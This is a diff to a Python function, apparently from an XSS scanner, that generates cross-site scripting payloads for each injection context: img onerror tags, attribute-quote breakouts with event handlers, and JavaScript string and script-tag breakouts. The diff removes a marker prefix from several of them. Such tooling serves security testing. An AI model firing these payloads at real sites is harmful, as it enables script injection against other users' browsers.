@@ -46,7 +46,7 @@ def _exec_payloads(marker: str, context: str) -> list[tuple[str, str]]:
     img = f"<img src=x onerror=\"{hit}\">"
     out = []
     if context in ("html_text", "unknown", "dom_html"):
-        out.append((f"<span>{marker}</span>{img}", "html_text img-onerror"))
+        out.append((img, "html_text img-onerror"))
     if context in ("html_attr", "html_attr_quoted", "html_attr_url", "unknown"):
         # Break out of either quote style. Keep the event-handler attribute double-quoted so
         # the marker's single quotes do not corrupt the generated HTML.
@@ -58,10 +58,10 @@ def _exec_payloads(marker: str, context: str) -> list[tuple[str, str]]:
         out.append((f"' onmouseover=\"{hit}\" x='", "quoted(sq) attr handler breakout"))
     if context in ("html_attr_unquoted",):
         # unquoted attribute: no metachar needed, an event handler alone injects
-        out.append((f"{marker} onmouseover={hit} x", "unquoted attr handler"))
+        out.append((f"x onmouseover={hit} x", "unquoted attr handler"))
     if context in ("js_string", "unknown"):
-        out.append((f"{marker}\";{hit};//", "js string breakout"))
-        out.append((f"{marker}</script><img src=x onerror=\"{hit}\">", "script close + img"))
+        out.append((f"\";{hit};//", "js string breakout"))
+        out.append((f"</script><img src=x onerror=\"{hit}\">", "script close + img"))
     if context in ("url", "html_attr_url"):
         # URL-valued attributes may execute in a child browsing context (for example iframe src).
         # Write the harmless sentinel onto the top page so the authoritative oracle can observe it.
